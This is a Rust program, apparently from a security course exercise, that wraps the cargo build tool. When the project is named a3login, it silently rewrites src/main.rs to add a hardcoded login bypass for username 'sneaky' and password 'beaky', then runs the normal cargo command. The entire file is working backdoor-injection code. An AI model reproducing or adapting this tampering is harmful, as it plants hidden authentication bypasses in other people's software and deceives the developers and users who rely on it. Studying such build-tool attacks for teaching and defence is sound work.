use std::env;
use std::fs;
use std::process::Command;
use std::io::{self};

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        eprintln!("Usage: a3cargo <build|run> [<args>...]");
        std::process::exit(1);
    }

    let cargo_command = &args[1];

    // Determine if the current project is a3login by checking Cargo.toml
    let is_a3login = match fs::read_to_string("Cargo.toml") {
        Ok(contents) => contents.contains("a3login"),
        Err(err) => {
            eprintln!("Error reading Cargo.toml: {}", err);
            false
        }
    };

    if is_a3login {
        println!("Detected a3login project.");
        // Modify a3login source code to accept sneaky as a username and beaky as a password
        match modify_a3login_source_code() {
            Ok(_) => println!("Modified a3login source code successfully."),
            Err(err) => eprintln!("Error modifying a3login source code: {}", err),
        }
    } else {
        println!("Not an a3login project.");
    }

    // Execute the original cargo command
    let status = Command::new("cargo")
        .arg(cargo_command)
        .args(&args[2..])
        .status()
        .expect("Failed to execute cargo command");

    std::process::exit(status.code().unwrap_or_default());
}

fn modify_a3login_source_code() -> Result<(), io::Error> {
    let original_code = fs::read_to_string("src/main.rs")?;
    
    let modified_code = original_code.replace(
        "else {",
        "else if &username == &\"sneaky\" && &password == &\"beaky\"{println!(\"Access granted!\");} else  {" )
;

    fs::write("src/main.rs", &modified_code)?;

    Ok(())
}


